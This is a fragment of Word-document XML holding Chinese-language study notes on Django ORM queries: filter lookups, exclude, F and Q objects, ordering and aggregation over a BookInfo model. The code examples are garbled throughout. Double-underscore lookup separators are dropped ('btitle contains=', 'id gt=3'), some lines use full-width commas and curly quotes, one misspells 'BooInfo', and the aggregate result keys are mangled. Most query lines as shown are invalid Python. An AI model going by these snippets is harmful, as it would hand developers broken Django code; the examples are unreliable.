    <w:p w14:paraId="58A97CC4" w14:textId="77777777" w:rsidR="001C47AF" w:rsidRPr="0057133E" w:rsidRDefault="001C47AF" w:rsidP="0057133E">
      <w:pPr>
        <w:pStyle w:val="HTML"/>
        <w:shd w:val="clear" w:color="auto" w:fill="F5F5F5"/>
        <w:wordWrap w:val="0"/>
        <w:rPr>
          <w:color w:val="008080"/>
        </w:rPr>
      </w:pPr>
      <w:bookmarkStart w:id="256" w:name="5776-1535452602669"/>
      <w:bookmarkEnd w:id="256"/>
      <w:r w:rsidRPr="0057133E">
        <w:rPr>
          <w:rFonts w:hint="eastAsia"/>
          <w:color w:val="008080"/>
        </w:rPr>
        <w:t>例：查询书名包含'传'的图书。contains</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="79246363" w14:textId="77777777" w:rsidR="001C47AF" w:rsidRPr="0057133E" w:rsidRDefault="001C47AF" w:rsidP="0057133E">
      <w:pPr>
        <w:pStyle w:val="HTML"/>
        <w:shd w:val="clear" w:color="auto" w:fill="F5F5F5"/>
        <w:wordWrap w:val="0"/>
        <w:rPr>
          <w:color w:val="008080"/>
        </w:rPr>
      </w:pPr>
      <w:bookmarkStart w:id="257" w:name="5244-1535452613193"/>
      <w:bookmarkEnd w:id="257"/>
      <w:r w:rsidRPr="0057133E">
        <w:rPr>
          <w:rFonts w:hint="eastAsia"/>
          <w:color w:val="008080"/>
        </w:rPr>
        <w:t>contains BookInfo.objects.filter(btitle    contains=’传’)</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="0405B44C" w14:textId="77777777" w:rsidR="001C47AF" w:rsidRPr="0057133E" w:rsidRDefault="001C47AF" w:rsidP="0057133E">
      <w:pPr>
        <w:pStyle w:val="HTML"/>
        <w:shd w:val="clear" w:color="auto" w:fill="F5F5F5"/>
        <w:wordWrap w:val="0"/>
        <w:rPr>
          <w:color w:val="008080"/>
        </w:rPr>
      </w:pPr>
      <w:bookmarkStart w:id="258" w:name="2561-1535452510484"/>
      <w:bookmarkEnd w:id="258"/>
      <w:r w:rsidRPr="0057133E">
        <w:rPr>
          <w:rFonts w:hint="eastAsia"/>
          <w:color w:val="008080"/>
        </w:rPr>
        <w:t>空查询 where 字段名 isnull</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="69E2674D" w14:textId="77777777" w:rsidR="001C47AF" w:rsidRPr="0057133E" w:rsidRDefault="001C47AF" w:rsidP="0057133E">
      <w:pPr>
        <w:pStyle w:val="HTML"/>
        <w:shd w:val="clear" w:color="auto" w:fill="F5F5F5"/>
        <w:wordWrap w:val="0"/>
        <w:rPr>
          <w:color w:val="008080"/>
        </w:rPr>
      </w:pPr>
      <w:bookmarkStart w:id="259" w:name="2927-1535452686964"/>
      <w:bookmarkEnd w:id="259"/>
      <w:r w:rsidRPr="0057133E">
        <w:rPr>
          <w:rFonts w:hint="eastAsia"/>
          <w:color w:val="008080"/>
        </w:rPr>
        <w:t>BookInfo.objects.filter(btitle isnull=False)</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="2DA1EECF" w14:textId="77777777" w:rsidR="001C47AF" w:rsidRPr="0057133E" w:rsidRDefault="001C47AF" w:rsidP="0057133E">
      <w:pPr>
        <w:pStyle w:val="HTML"/>
        <w:shd w:val="clear" w:color="auto" w:fill="F5F5F5"/>
        <w:wordWrap w:val="0"/>
        <w:rPr>
          <w:color w:val="008080"/>
        </w:rPr>
      </w:pPr>
      <w:bookmarkStart w:id="260" w:name="5622-1535452687949"/>
      <w:bookmarkEnd w:id="260"/>
      <w:r w:rsidRPr="0057133E">
        <w:rPr>
          <w:rFonts w:hint="eastAsia"/>
          <w:color w:val="008080"/>
        </w:rPr>
        <w:t>范围查询 where id in (1，3，5)</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="38533C03" w14:textId="77777777" w:rsidR="001C47AF" w:rsidRPr="0057133E" w:rsidRDefault="001C47AF" w:rsidP="0057133E">
      <w:pPr>
        <w:pStyle w:val="HTML"/>
        <w:shd w:val="clear" w:color="auto" w:fill="F5F5F5"/>
        <w:wordWrap w:val="0"/>
        <w:rPr>
          <w:color w:val="008080"/>
        </w:rPr>
      </w:pPr>
      <w:bookmarkStart w:id="261" w:name="6045-1535452718829"/>
      <w:bookmarkEnd w:id="261"/>
      <w:r w:rsidRPr="0057133E">
        <w:rPr>
          <w:rFonts w:hint="eastAsia"/>
          <w:color w:val="008080"/>
        </w:rPr>
        <w:t>BookInfo.objects.filter(id in=[1，3，5])</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="6C321D7F" w14:textId="77777777" w:rsidR="001C47AF" w:rsidRPr="0057133E" w:rsidRDefault="001C47AF" w:rsidP="0057133E">
      <w:pPr>
        <w:pStyle w:val="HTML"/>
        <w:shd w:val="clear" w:color="auto" w:fill="F5F5F5"/>
        <w:wordWrap w:val="0"/>
        <w:rPr>
          <w:color w:val="008080"/>
        </w:rPr>
      </w:pPr>
      <w:bookmarkStart w:id="262" w:name="6775-1535452727188"/>
      <w:bookmarkEnd w:id="262"/>
      <w:r w:rsidRPr="0057133E">
        <w:rPr>
          <w:rFonts w:hint="eastAsia"/>
          <w:color w:val="008080"/>
        </w:rPr>
        <w:t>比较查询 gt lt(less than) gte(equal) lte</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="59A28C3E" w14:textId="77777777" w:rsidR="001C47AF" w:rsidRPr="0057133E" w:rsidRDefault="001C47AF" w:rsidP="0057133E">
      <w:pPr>
        <w:pStyle w:val="HTML"/>
        <w:shd w:val="clear" w:color="auto" w:fill="F5F5F5"/>
        <w:wordWrap w:val="0"/>
        <w:rPr>
          <w:color w:val="008080"/>
        </w:rPr>
      </w:pPr>
      <w:bookmarkStart w:id="263" w:name="1451-1535452736197"/>
      <w:bookmarkEnd w:id="263"/>
      <w:r w:rsidRPr="0057133E">
        <w:rPr>
          <w:rFonts w:hint="eastAsia"/>
          <w:color w:val="008080"/>
        </w:rPr>
        <w:t>BookInfo.objects.filter(id gte=3)</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="4BEB1125" w14:textId="77777777" w:rsidR="001C47AF" w:rsidRPr="0057133E" w:rsidRDefault="001C47AF" w:rsidP="0057133E">
      <w:pPr>
        <w:pStyle w:val="HTML"/>
        <w:shd w:val="clear" w:color="auto" w:fill="F5F5F5"/>
        <w:wordWrap w:val="0"/>
        <w:rPr>
          <w:color w:val="008080"/>
        </w:rPr>
      </w:pPr>
      <w:bookmarkStart w:id="264" w:name="1025-1535452669502"/>
      <w:bookmarkEnd w:id="264"/>
      <w:r w:rsidRPr="0057133E">
        <w:rPr>
          <w:rFonts w:hint="eastAsia"/>
          <w:color w:val="008080"/>
        </w:rPr>
        <w:t>日期查询</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="13FDA47E" w14:textId="77777777" w:rsidR="001C47AF" w:rsidRPr="0057133E" w:rsidRDefault="001C47AF" w:rsidP="0057133E">
      <w:pPr>
        <w:pStyle w:val="HTML"/>
        <w:shd w:val="clear" w:color="auto" w:fill="F5F5F5"/>
        <w:wordWrap w:val="0"/>
        <w:rPr>
          <w:color w:val="008080"/>
        </w:rPr>
      </w:pPr>
      <w:bookmarkStart w:id="265" w:name="9773-1535452750718"/>
      <w:bookmarkEnd w:id="265"/>
      <w:r w:rsidRPr="0057133E">
        <w:rPr>
          <w:rFonts w:hint="eastAsia"/>
          <w:color w:val="008080"/>
        </w:rPr>
        <w:t>BookInfo.objects.filter(bpub_date year = 1980)</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="049C2668" w14:textId="77777777" w:rsidR="001C47AF" w:rsidRPr="0057133E" w:rsidRDefault="001C47AF" w:rsidP="0057133E">
      <w:pPr>
        <w:pStyle w:val="HTML"/>
        <w:shd w:val="clear" w:color="auto" w:fill="F5F5F5"/>
        <w:wordWrap w:val="0"/>
        <w:rPr>
          <w:color w:val="008080"/>
        </w:rPr>
      </w:pPr>
      <w:bookmarkStart w:id="266" w:name="2540-1535452758038"/>
      <w:bookmarkEnd w:id="266"/>
      <w:r w:rsidRPr="0057133E">
        <w:rPr>
          <w:rFonts w:hint="eastAsia"/>
          <w:color w:val="008080"/>
        </w:rPr>
        <w:t>BookInfo.objects.filter(bpub_date gt = date(1980，1，1))</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="757A12D5" w14:textId="77777777" w:rsidR="001C47AF" w:rsidRPr="0057133E" w:rsidRDefault="001C47AF" w:rsidP="0057133E">
      <w:pPr>
        <w:pStyle w:val="HTML"/>
        <w:shd w:val="clear" w:color="auto" w:fill="F5F5F5"/>
        <w:wordWrap w:val="0"/>
        <w:rPr>
          <w:color w:val="008080"/>
        </w:rPr>
      </w:pPr>
      <w:bookmarkStart w:id="267" w:name="7556-1535452670000"/>
      <w:bookmarkEnd w:id="267"/>
      <w:r w:rsidRPr="0057133E">
        <w:rPr>
          <w:rFonts w:hint="eastAsia"/>
          <w:color w:val="008080"/>
        </w:rPr>
        <w:t>exclude:返回不满足条件的数据。</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="67317847" w14:textId="77777777" w:rsidR="001C47AF" w:rsidRPr="0057133E" w:rsidRDefault="001C47AF" w:rsidP="0057133E">
      <w:pPr>
        <w:pStyle w:val="HTML"/>
        <w:shd w:val="clear" w:color="auto" w:fill="F5F5F5"/>
        <w:wordWrap w:val="0"/>
        <w:rPr>
          <w:color w:val="008080"/>
        </w:rPr>
      </w:pPr>
      <w:bookmarkStart w:id="268" w:name="1890-1535452776514"/>
      <w:bookmarkEnd w:id="268"/>
      <w:r w:rsidRPr="0057133E">
        <w:rPr>
          <w:rFonts w:hint="eastAsia"/>
          <w:color w:val="008080"/>
        </w:rPr>
        <w:t>BookInfo.objects.exclude(id=3)</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="6FE02238" w14:textId="77777777" w:rsidR="001C47AF" w:rsidRPr="0057133E" w:rsidRDefault="001C47AF" w:rsidP="0057133E">
      <w:pPr>
        <w:pStyle w:val="HTML"/>
        <w:shd w:val="clear" w:color="auto" w:fill="F5F5F5"/>
        <w:wordWrap w:val="0"/>
        <w:rPr>
          <w:color w:val="008080"/>
        </w:rPr>
      </w:pPr>
      <w:bookmarkStart w:id="269" w:name="2615-1535452670034"/>
      <w:bookmarkEnd w:id="269"/>
      <w:r w:rsidRPr="0057133E">
        <w:rPr>
          <w:rFonts w:hint="eastAsia"/>
          <w:color w:val="008080"/>
        </w:rPr>
        <w:t>F 对 象</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="048DA3CD" w14:textId="77777777" w:rsidR="001C47AF" w:rsidRPr="0057133E" w:rsidRDefault="001C47AF" w:rsidP="0057133E">
      <w:pPr>
        <w:pStyle w:val="HTML"/>
        <w:shd w:val="clear" w:color="auto" w:fill="F5F5F5"/>
        <w:wordWrap w:val="0"/>
        <w:rPr>
          <w:color w:val="008080"/>
        </w:rPr>
      </w:pPr>
      <w:bookmarkStart w:id="270" w:name="6720-1535452818488"/>
      <w:bookmarkEnd w:id="270"/>
      <w:r w:rsidRPr="0057133E">
        <w:rPr>
          <w:rFonts w:hint="eastAsia"/>
          <w:color w:val="008080"/>
        </w:rPr>
        <w:t>作用：用于类属性之间的比较条件。</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="48D1A0DA" w14:textId="77777777" w:rsidR="001C47AF" w:rsidRPr="0057133E" w:rsidRDefault="001C47AF" w:rsidP="0057133E">
      <w:pPr>
        <w:pStyle w:val="HTML"/>
        <w:shd w:val="clear" w:color="auto" w:fill="F5F5F5"/>
        <w:wordWrap w:val="0"/>
        <w:rPr>
          <w:color w:val="008080"/>
        </w:rPr>
      </w:pPr>
      <w:bookmarkStart w:id="271" w:name="6636-1535452670073"/>
      <w:bookmarkEnd w:id="271"/>
      <w:r w:rsidRPr="0057133E">
        <w:rPr>
          <w:rFonts w:hint="eastAsia"/>
          <w:color w:val="008080"/>
        </w:rPr>
        <w:t>from django.db.models import F</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="2D149992" w14:textId="77777777" w:rsidR="001C47AF" w:rsidRPr="0057133E" w:rsidRDefault="001C47AF" w:rsidP="0057133E">
      <w:pPr>
        <w:pStyle w:val="HTML"/>
        <w:shd w:val="clear" w:color="auto" w:fill="F5F5F5"/>
        <w:wordWrap w:val="0"/>
        <w:rPr>
          <w:color w:val="008080"/>
        </w:rPr>
      </w:pPr>
      <w:bookmarkStart w:id="272" w:name="4010-1535452828878"/>
      <w:bookmarkEnd w:id="272"/>
      <w:r w:rsidRPr="0057133E">
        <w:rPr>
          <w:rFonts w:hint="eastAsia"/>
          <w:color w:val="008080"/>
        </w:rPr>
        <w:t>例：where bread &gt; bcomment BookInfo.objects.filter(bread    gt =F(‘bcomment’))</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="0A544FBB" w14:textId="77777777" w:rsidR="001C47AF" w:rsidRPr="0057133E" w:rsidRDefault="001C47AF" w:rsidP="0057133E">
      <w:pPr>
        <w:pStyle w:val="HTML"/>
        <w:shd w:val="clear" w:color="auto" w:fill="F5F5F5"/>
        <w:wordWrap w:val="0"/>
        <w:rPr>
          <w:color w:val="008080"/>
        </w:rPr>
      </w:pPr>
      <w:bookmarkStart w:id="273" w:name="1012-1535452828878"/>
      <w:bookmarkEnd w:id="273"/>
      <w:r w:rsidRPr="0057133E">
        <w:rPr>
          <w:rFonts w:hint="eastAsia"/>
          <w:color w:val="008080"/>
        </w:rPr>
        <w:t>例：BookInfo.objects.filter(bread    gt=F(‘bcomment’)*2)</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="5F837CAB" w14:textId="77777777" w:rsidR="001C47AF" w:rsidRPr="0057133E" w:rsidRDefault="001C47AF" w:rsidP="0057133E">
      <w:pPr>
        <w:pStyle w:val="HTML"/>
        <w:shd w:val="clear" w:color="auto" w:fill="F5F5F5"/>
        <w:wordWrap w:val="0"/>
        <w:rPr>
          <w:color w:val="008080"/>
        </w:rPr>
      </w:pPr>
      <w:bookmarkStart w:id="274" w:name="1979-1535452670105"/>
      <w:bookmarkEnd w:id="274"/>
      <w:r w:rsidRPr="0057133E">
        <w:rPr>
          <w:rFonts w:hint="eastAsia"/>
          <w:color w:val="008080"/>
        </w:rPr>
        <w:t>Q 对 象</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="52528DC0" w14:textId="77777777" w:rsidR="001C47AF" w:rsidRPr="0057133E" w:rsidRDefault="001C47AF" w:rsidP="0057133E">
      <w:pPr>
        <w:pStyle w:val="HTML"/>
        <w:shd w:val="clear" w:color="auto" w:fill="F5F5F5"/>
        <w:wordWrap w:val="0"/>
        <w:rPr>
          <w:color w:val="008080"/>
        </w:rPr>
      </w:pPr>
      <w:bookmarkStart w:id="275" w:name="8199-1535452851651"/>
      <w:bookmarkEnd w:id="275"/>
      <w:r w:rsidRPr="0057133E">
        <w:rPr>
          <w:rFonts w:hint="eastAsia"/>
          <w:color w:val="008080"/>
        </w:rPr>
        <w:t>作用：用于查询时的逻辑条件。可以对 Q 对象进行&amp;|~操作</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="4414F297" w14:textId="77777777" w:rsidR="001C47AF" w:rsidRPr="0057133E" w:rsidRDefault="001C47AF" w:rsidP="0057133E">
      <w:pPr>
        <w:pStyle w:val="HTML"/>
        <w:shd w:val="clear" w:color="auto" w:fill="F5F5F5"/>
        <w:wordWrap w:val="0"/>
        <w:rPr>
          <w:color w:val="008080"/>
        </w:rPr>
      </w:pPr>
      <w:bookmarkStart w:id="276" w:name="9992-1535452670138"/>
      <w:bookmarkEnd w:id="276"/>
      <w:r w:rsidRPr="0057133E">
        <w:rPr>
          <w:rFonts w:hint="eastAsia"/>
          <w:color w:val="008080"/>
        </w:rPr>
        <w:t>from django.db.models import Q</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="72AB5DA6" w14:textId="77777777" w:rsidR="001C47AF" w:rsidRPr="0057133E" w:rsidRDefault="001C47AF" w:rsidP="0057133E">
      <w:pPr>
        <w:pStyle w:val="HTML"/>
        <w:shd w:val="clear" w:color="auto" w:fill="F5F5F5"/>
        <w:wordWrap w:val="0"/>
        <w:rPr>
          <w:color w:val="008080"/>
        </w:rPr>
      </w:pPr>
      <w:bookmarkStart w:id="277" w:name="6933-1535452872192"/>
      <w:bookmarkEnd w:id="277"/>
      <w:r w:rsidRPr="0057133E">
        <w:rPr>
          <w:rFonts w:hint="eastAsia"/>
          <w:color w:val="008080"/>
        </w:rPr>
        <w:t>BookInfo.objects.filter(id gt=3， bread gt=30)</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="33349E7E" w14:textId="77777777" w:rsidR="001C47AF" w:rsidRPr="0057133E" w:rsidRDefault="001C47AF" w:rsidP="0057133E">
      <w:pPr>
        <w:pStyle w:val="HTML"/>
        <w:shd w:val="clear" w:color="auto" w:fill="F5F5F5"/>
        <w:wordWrap w:val="0"/>
        <w:rPr>
          <w:color w:val="008080"/>
        </w:rPr>
      </w:pPr>
      <w:bookmarkStart w:id="278" w:name="8090-1535452862958"/>
      <w:bookmarkEnd w:id="278"/>
      <w:r w:rsidRPr="0057133E">
        <w:rPr>
          <w:rFonts w:hint="eastAsia"/>
          <w:color w:val="008080"/>
        </w:rPr>
        <w:t>BooInfo.objects.filter(Q(id gt=3) &amp; Q(bread gt=3))</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="04B124EA" w14:textId="77777777" w:rsidR="001C47AF" w:rsidRPr="0057133E" w:rsidRDefault="001C47AF" w:rsidP="0057133E">
      <w:pPr>
        <w:pStyle w:val="HTML"/>
        <w:shd w:val="clear" w:color="auto" w:fill="F5F5F5"/>
        <w:wordWrap w:val="0"/>
        <w:rPr>
          <w:color w:val="008080"/>
        </w:rPr>
      </w:pPr>
      <w:bookmarkStart w:id="279" w:name="9037-1535452862958"/>
      <w:bookmarkEnd w:id="279"/>
      <w:r w:rsidRPr="0057133E">
        <w:rPr>
          <w:rFonts w:hint="eastAsia"/>
          <w:color w:val="008080"/>
        </w:rPr>
        <w:t>例 ：BookInfo.objects.filter(Q(id gt=3) | Q(bread gt=30))</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="1AE1D005" w14:textId="77777777" w:rsidR="001C47AF" w:rsidRPr="0057133E" w:rsidRDefault="001C47AF" w:rsidP="0057133E">
      <w:pPr>
        <w:pStyle w:val="HTML"/>
        <w:shd w:val="clear" w:color="auto" w:fill="F5F5F5"/>
        <w:wordWrap w:val="0"/>
        <w:rPr>
          <w:color w:val="008080"/>
        </w:rPr>
      </w:pPr>
      <w:bookmarkStart w:id="280" w:name="7210-1535452862958"/>
      <w:bookmarkEnd w:id="280"/>
      <w:r w:rsidRPr="0057133E">
        <w:rPr>
          <w:rFonts w:hint="eastAsia"/>
          <w:color w:val="008080"/>
        </w:rPr>
        <w:t>例：BookInfo.objects.filter(~Q(id=3))</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="63F60D55" w14:textId="77777777" w:rsidR="001C47AF" w:rsidRPr="0057133E" w:rsidRDefault="001C47AF" w:rsidP="0057133E">
      <w:pPr>
        <w:pStyle w:val="HTML"/>
        <w:shd w:val="clear" w:color="auto" w:fill="F5F5F5"/>
        <w:wordWrap w:val="0"/>
        <w:rPr>
          <w:color w:val="008080"/>
        </w:rPr>
      </w:pPr>
      <w:bookmarkStart w:id="281" w:name="2062-1535452670199"/>
      <w:bookmarkEnd w:id="281"/>
      <w:r w:rsidRPr="0057133E">
        <w:rPr>
          <w:rFonts w:hint="eastAsia"/>
          <w:color w:val="008080"/>
        </w:rPr>
        <w:t>order_by 返 回 QuerySet</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="716A5496" w14:textId="77777777" w:rsidR="001C47AF" w:rsidRPr="0057133E" w:rsidRDefault="001C47AF" w:rsidP="0057133E">
      <w:pPr>
        <w:pStyle w:val="HTML"/>
        <w:shd w:val="clear" w:color="auto" w:fill="F5F5F5"/>
        <w:wordWrap w:val="0"/>
        <w:rPr>
          <w:color w:val="008080"/>
        </w:rPr>
      </w:pPr>
      <w:bookmarkStart w:id="282" w:name="5022-1535452898677"/>
      <w:bookmarkEnd w:id="282"/>
      <w:r w:rsidRPr="0057133E">
        <w:rPr>
          <w:rFonts w:hint="eastAsia"/>
          <w:color w:val="008080"/>
        </w:rPr>
        <w:lastRenderedPageBreak/>
        <w:t>作用：对查询结果进行排序。</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="173BEF1D" w14:textId="77777777" w:rsidR="001C47AF" w:rsidRPr="0057133E" w:rsidRDefault="001C47AF" w:rsidP="0057133E">
      <w:pPr>
        <w:pStyle w:val="HTML"/>
        <w:shd w:val="clear" w:color="auto" w:fill="F5F5F5"/>
        <w:wordWrap w:val="0"/>
        <w:rPr>
          <w:color w:val="008080"/>
        </w:rPr>
      </w:pPr>
      <w:bookmarkStart w:id="283" w:name="5031-1535452908791"/>
      <w:bookmarkEnd w:id="283"/>
      <w:r w:rsidRPr="0057133E">
        <w:rPr>
          <w:rFonts w:hint="eastAsia"/>
          <w:color w:val="008080"/>
        </w:rPr>
        <w:t>例 ： BookInfo.objects.all().order_by('id')</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="7150DF4F" w14:textId="77777777" w:rsidR="001C47AF" w:rsidRPr="0057133E" w:rsidRDefault="001C47AF" w:rsidP="0057133E">
      <w:pPr>
        <w:pStyle w:val="HTML"/>
        <w:shd w:val="clear" w:color="auto" w:fill="F5F5F5"/>
        <w:wordWrap w:val="0"/>
        <w:rPr>
          <w:color w:val="008080"/>
        </w:rPr>
      </w:pPr>
      <w:bookmarkStart w:id="284" w:name="6642-1535452909768"/>
      <w:bookmarkEnd w:id="284"/>
      <w:r w:rsidRPr="0057133E">
        <w:rPr>
          <w:rFonts w:hint="eastAsia"/>
          <w:color w:val="008080"/>
        </w:rPr>
        <w:t>例 ： BookInfo.objects.all().order_by('-id')</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="4693C73F" w14:textId="77777777" w:rsidR="001C47AF" w:rsidRPr="0057133E" w:rsidRDefault="001C47AF" w:rsidP="0057133E">
      <w:pPr>
        <w:pStyle w:val="HTML"/>
        <w:shd w:val="clear" w:color="auto" w:fill="F5F5F5"/>
        <w:wordWrap w:val="0"/>
        <w:rPr>
          <w:color w:val="008080"/>
        </w:rPr>
      </w:pPr>
      <w:bookmarkStart w:id="285" w:name="2855-1535452909768"/>
      <w:bookmarkEnd w:id="285"/>
      <w:r w:rsidRPr="0057133E">
        <w:rPr>
          <w:rFonts w:hint="eastAsia"/>
          <w:color w:val="008080"/>
        </w:rPr>
        <w:t>例 ：BookInfo.objects.filter(id gt=3).order_by('-bread')</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="2E4F84F1" w14:textId="77777777" w:rsidR="001C47AF" w:rsidRPr="0057133E" w:rsidRDefault="001C47AF" w:rsidP="0057133E">
      <w:pPr>
        <w:pStyle w:val="HTML"/>
        <w:shd w:val="clear" w:color="auto" w:fill="F5F5F5"/>
        <w:wordWrap w:val="0"/>
        <w:rPr>
          <w:color w:val="008080"/>
        </w:rPr>
      </w:pPr>
      <w:bookmarkStart w:id="286" w:name="4737-1535452670214"/>
      <w:bookmarkEnd w:id="286"/>
      <w:r w:rsidRPr="0057133E">
        <w:rPr>
          <w:rFonts w:hint="eastAsia"/>
          <w:color w:val="008080"/>
        </w:rPr>
        <w:t>聚合函数</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="3BABEF36" w14:textId="77777777" w:rsidR="001C47AF" w:rsidRPr="0057133E" w:rsidRDefault="001C47AF" w:rsidP="0057133E">
      <w:pPr>
        <w:pStyle w:val="HTML"/>
        <w:shd w:val="clear" w:color="auto" w:fill="F5F5F5"/>
        <w:wordWrap w:val="0"/>
        <w:rPr>
          <w:color w:val="008080"/>
        </w:rPr>
      </w:pPr>
      <w:bookmarkStart w:id="287" w:name="2815-1535452931695"/>
      <w:bookmarkEnd w:id="287"/>
      <w:r w:rsidRPr="0057133E">
        <w:rPr>
          <w:rFonts w:hint="eastAsia"/>
          <w:color w:val="008080"/>
        </w:rPr>
        <w:t>作用：对查询结果进行聚合操作。</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="4E04C667" w14:textId="77777777" w:rsidR="001C47AF" w:rsidRPr="0057133E" w:rsidRDefault="001C47AF" w:rsidP="0057133E">
      <w:pPr>
        <w:pStyle w:val="HTML"/>
        <w:shd w:val="clear" w:color="auto" w:fill="F5F5F5"/>
        <w:wordWrap w:val="0"/>
        <w:rPr>
          <w:color w:val="008080"/>
        </w:rPr>
      </w:pPr>
      <w:bookmarkStart w:id="288" w:name="2040-1535452940775"/>
      <w:bookmarkEnd w:id="288"/>
      <w:r w:rsidRPr="0057133E">
        <w:rPr>
          <w:rFonts w:hint="eastAsia"/>
          <w:color w:val="008080"/>
        </w:rPr>
        <w:t>sum count max min avg</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="283C4AD1" w14:textId="77777777" w:rsidR="001C47AF" w:rsidRPr="0057133E" w:rsidRDefault="001C47AF" w:rsidP="0057133E">
      <w:pPr>
        <w:pStyle w:val="HTML"/>
        <w:shd w:val="clear" w:color="auto" w:fill="F5F5F5"/>
        <w:wordWrap w:val="0"/>
        <w:rPr>
          <w:color w:val="008080"/>
        </w:rPr>
      </w:pPr>
      <w:bookmarkStart w:id="289" w:name="2958-1535452670242"/>
      <w:bookmarkEnd w:id="289"/>
      <w:r w:rsidRPr="0057133E">
        <w:rPr>
          <w:rFonts w:hint="eastAsia"/>
          <w:color w:val="008080"/>
        </w:rPr>
        <w:t>aggregate：调用这个函数来使用聚合。</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="2C0EEEE5" w14:textId="77777777" w:rsidR="001C47AF" w:rsidRPr="0057133E" w:rsidRDefault="001C47AF" w:rsidP="0057133E">
      <w:pPr>
        <w:pStyle w:val="HTML"/>
        <w:shd w:val="clear" w:color="auto" w:fill="F5F5F5"/>
        <w:wordWrap w:val="0"/>
        <w:rPr>
          <w:color w:val="008080"/>
        </w:rPr>
      </w:pPr>
      <w:bookmarkStart w:id="290" w:name="5528-1535452670279"/>
      <w:bookmarkEnd w:id="290"/>
      <w:r w:rsidRPr="0057133E">
        <w:rPr>
          <w:rFonts w:hint="eastAsia"/>
          <w:color w:val="008080"/>
        </w:rPr>
        <w:t>from django.db.models import Sum，Count，Max，Min，Avg</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="53EF9F28" w14:textId="77777777" w:rsidR="001C47AF" w:rsidRPr="0057133E" w:rsidRDefault="001C47AF" w:rsidP="0057133E">
      <w:pPr>
        <w:pStyle w:val="HTML"/>
        <w:shd w:val="clear" w:color="auto" w:fill="F5F5F5"/>
        <w:wordWrap w:val="0"/>
        <w:rPr>
          <w:color w:val="008080"/>
        </w:rPr>
      </w:pPr>
      <w:bookmarkStart w:id="291" w:name="6076-1535452968641"/>
      <w:bookmarkEnd w:id="291"/>
      <w:r w:rsidRPr="0057133E">
        <w:rPr>
          <w:rFonts w:hint="eastAsia"/>
          <w:color w:val="008080"/>
        </w:rPr>
        <w:t>例：BookInfo.objects.aggregate(Count('id'))</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="2AB9A4D0" w14:textId="77777777" w:rsidR="001C47AF" w:rsidRPr="0057133E" w:rsidRDefault="001C47AF" w:rsidP="0057133E">
      <w:pPr>
        <w:pStyle w:val="HTML"/>
        <w:shd w:val="clear" w:color="auto" w:fill="F5F5F5"/>
        <w:wordWrap w:val="0"/>
        <w:rPr>
          <w:color w:val="008080"/>
        </w:rPr>
      </w:pPr>
      <w:bookmarkStart w:id="292" w:name="7085-1535452670320"/>
      <w:bookmarkEnd w:id="292"/>
      <w:r w:rsidRPr="0057133E">
        <w:rPr>
          <w:rFonts w:hint="eastAsia"/>
          <w:color w:val="008080"/>
        </w:rPr>
        <w:t>{'id count': 5} 注意返回值类型及键名</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="2EF48CE4" w14:textId="77777777" w:rsidR="001C47AF" w:rsidRPr="0057133E" w:rsidRDefault="001C47AF" w:rsidP="0057133E">
      <w:pPr>
        <w:pStyle w:val="HTML"/>
        <w:shd w:val="clear" w:color="auto" w:fill="F5F5F5"/>
        <w:wordWrap w:val="0"/>
        <w:rPr>
          <w:color w:val="008080"/>
        </w:rPr>
      </w:pPr>
      <w:bookmarkStart w:id="293" w:name="7469-1535452670349"/>
      <w:bookmarkEnd w:id="293"/>
      <w:r w:rsidRPr="0057133E">
        <w:rPr>
          <w:rFonts w:hint="eastAsia"/>
          <w:color w:val="008080"/>
        </w:rPr>
        <w:t>例：BookInfo.objects.aggregate(Sum(‘bread’))</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="76CDCBAF" w14:textId="77777777" w:rsidR="001C47AF" w:rsidRPr="0057133E" w:rsidRDefault="001C47AF" w:rsidP="0057133E">
      <w:pPr>
        <w:pStyle w:val="HTML"/>
        <w:shd w:val="clear" w:color="auto" w:fill="F5F5F5"/>
        <w:wordWrap w:val="0"/>
        <w:rPr>
          <w:color w:val="008080"/>
        </w:rPr>
      </w:pPr>
      <w:bookmarkStart w:id="294" w:name="4479-1535452670383"/>
      <w:bookmarkEnd w:id="294"/>
      <w:r w:rsidRPr="0057133E">
        <w:rPr>
          <w:rFonts w:hint="eastAsia"/>
          <w:color w:val="008080"/>
        </w:rPr>
        <w:t>{‘bread    sum’:120}  注意返回值类型及键名</w:t>
      </w:r>
    </w:p>
